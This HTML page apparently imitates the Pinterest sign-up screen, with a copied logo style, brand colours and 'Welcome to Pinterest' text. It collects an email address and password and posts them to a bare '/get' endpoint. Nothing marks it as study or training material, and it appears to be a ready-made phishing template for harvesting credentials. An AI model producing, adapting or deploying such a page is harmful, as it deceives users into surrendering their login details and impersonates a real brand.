<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Pinterest</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:380px;text-align:center}
.logo{margin-bottom:16px}
.logo svg{width:40px;height:40px}
h1{font-size:28px;font-weight:700;color:#111;margin-bottom:6px}
.sub{font-size:20px;color:#111;margin-bottom:4px}
p{font-size:14px;color:#767676;margin-bottom:24px}
.form-group{margin-bottom:14px;text-align:left}
.form-group label{display:block;font-size:12px;color:#333;margin-bottom:4px;font-weight:600}
.form-group input{width:100%;padding:14px;border:2px solid #cdcdcd;border-radius:16px;font-size:16px;outline:none;background:#fff}
.form-group input:focus{border-color:#0074e8}
.btn{width:100%;padding:14px;background:#e60023;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.btn:active{transform:scale(0.98)}
.divider{display:flex;align-items:center;margin:18px 0;color:#767676;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;border-top:1px solid #cdcdcd}
.divider span{padding:0 12px}
.footer{margin-top:16px;font-size:13px;color:#767676}
.footer a{color:#0074e8;text-decoration:none;font-weight:600}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#e60023"/><text x="20" y="28" text-anchor="middle" font-size="24" font-weight="700" fill="#fff" font-family="Arial">P</text></svg>
</div>
<h1>Welcome to Pinterest</h1>
<p>Find new ideas to try</p>
<form action="/get" method="POST">
<div class="form-group">
<label>Email</label>
<input name="email" type="email" placeholder="Email" required autocomplete="off">
</div>
<div class="form-group">
<label>Password</label>
<input name="password" type="password" placeholder="Create a password" required autocomplete="off">
</div>
<button type="submit" class="btn">Continue</button>
</form>
<div class="footer">
Already a member? <a href="#">Log in</a>
</div>
</div>
</body>
</html>
